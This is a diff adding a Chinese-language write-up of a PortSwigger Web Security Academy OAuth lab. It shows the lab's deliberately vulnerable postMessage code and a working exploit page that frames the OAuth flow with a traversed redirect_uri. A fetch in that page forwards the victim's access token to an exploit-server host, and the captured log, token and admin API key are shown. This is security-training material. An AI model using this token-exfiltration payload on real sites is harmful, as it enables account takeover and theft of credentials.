@@ -218,6 +218,142 @@ Your API Key is: [hidden]
 2. 要發現 `location.hash` 不會顯示在 Access Log，並且找到 alternative solution
 3. 成功登入 admin 帳號後，還要尋找 apiKey 是在哪個 API Endpoint 回傳的
 
+## Lab: Stealing OAuth access tokens via a proxy page
+
+| Dimension | Description                                                                                        |
+| --------- | -------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens           |
+| Lab       | https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page |
+
+我們先從這裡開始
+
+```
+To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account.
+```
+
+在留言板看到一個很有趣的 HTML
+
+```html
+<iframe
+  onload='this.height = this.contentWindow.document.body.scrollHeight + "px"'
+  width="100%"
+  frameborder="0"
+  src="/post/comment/comment-form#postId=10"
+  height="636px"
+></iframe>
+
+<script>
+  window.addEventListener(
+    "message",
+    function (e) {
+      if (e.data.type === "oncomment") {
+        e.data.content["csrf"] = "SLlXF7l8RVN3YJ3mZAWDn7vFq1z4DXJU";
+        const body = decodeURIComponent(
+          new URLSearchParams(e.data.content).toString(),
+        );
+        fetch("/post/comment", {
+          method: "POST",
+          body: body,
+        }).then((r) => window.location.reload());
+      }
+    },
+    false,
+  );
+</script>
+```
+
+iframe 內部
+
+```html
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      parent.postMessage({ type: "onload", data: window.location.href }, "*");
+      function submitForm(form, ev) {
+        ev.preventDefault();
+        const formData = new FormData(document.getElementById("comment-form"));
+        const hashParams = new URLSearchParams(window.location.hash.substr(1));
+        const o = {};
+        formData.forEach((v, k) => (o[k] = v));
+        hashParams.forEach((v, k) => (o[k] = v));
+        parent.postMessage({ type: "oncomment", content: o }, "*");
+        form.reset();
+      }
+    </script>
+    <hr />
+    <section class="add-comment">
+      <h2>Leave a comment</h2>
+      <form id="comment-form" onsubmit="submitForm(this, event)">
+        <label>Comment:</label>
+        <textarea required rows="12" cols="300" name="comment"></textarea>
+        <label>Name:</label>
+        <input required type="text" name="name" />
+        <label>Email:</label>
+        <input required type="email" name="email" />
+        <label>Website:</label>
+        <input pattern="(http:|https:).+" type="text" name="website" />
+        <button class="button" type="submit">Post Comment</button>
+      </form>
+    </section>
+  </body>
+</html>
+```
+
+重點應該在這裡，有機會把整個 URL 偷走，這是題目故意設計的 vulnerable code
+
+```js
+parent.postMessage({ type: "onload", data: window.location.href }, "*");
+```
+
+先確定 redirect_uri 可以設定 `/post/comment/comment-form`，https://oauth-0a3b00690304f08a80f083e302720086.oauth-server.net/auth?client_id=zny8vh0mgwfqi6zvjzepp&redirect_uri=https://0a78008d03ddf00b80008592005b0043.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=584928898&scope=openid%20profile%20email
+
+在 exploit-server 構造
+
+```html
+<script>
+  addEventListener("message", function (e) {
+    const url = e.data.data;
+    fetch(
+      `https://exploit-0a950082032af01d806f8451015800a8.exploit-server.net/?url=${encodeURIComponent(url)}`,
+    );
+  });
+</script>
+<iframe
+  src="https://oauth-0a3b00690304f08a80f083e302720086.oauth-server.net/auth?client_id=zny8vh0mgwfqi6zvjzepp&redirect_uri=https://0a78008d03ddf00b80008592005b0043.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=584928898&scope=openid%20profile%20email"
+></iframe>
+```
+
+之後就可以在 Access log 看到
+
+```
+10.0.3.240      2025-09-18 08:29:38 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
+10.0.3.240      2025-09-18 08:29:38 +0000 "GET /?url=https%3A%2F%2F0a78008d03ddf00b80008592005b0043.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3D7LodCFMonOVHInNo_WDKd2n31cL1mRWaHzOC0ncLzIY%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
+```
+
+decode 之後
+
+```js
+decodeURIComponent(
+  `https%3A%2F%2F0a78008d03ddf00b80008592005b0043.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3D7LodCFMonOVHInNo_WDKd2n31cL1mRWaHzOC0ncLzIY%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email`,
+);
+// https://0a78008d03ddf00b80008592005b0043.web-security-academy.net/post/comment/comment-form#access_token=7LodCFMonOVHInNo_WDKd2n31cL1mRWaHzOC0ncLzIY&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
+```
+
+接下來就跟上一題一模一樣的解法，瀏覽器訪問 https://0a78008d03ddf00b80008592005b0043.web-security-academy.net/oauth-callback#access_token=7LodCFMonOVHInNo_WDKd2n31cL1mRWaHzOC0ncLzIY，然後到 Burp Suite 看 HTTP History
+
+https://oauth-0a3b00690304f08a80f083e302720086.oauth-server.net/me
+
+```json
+{
+  "sub": "administrator",
+  "apikey": "d9c2oN6ohzINFbyFxPvLx6mAn3wKxZtG",
+  "name": "Administrator",
+  "email": "administrator@normal-user.net",
+  "email_verified": true
+}
+```
+
 ## 參考資料
 
 - https://portswigger.net/web-security/oauth
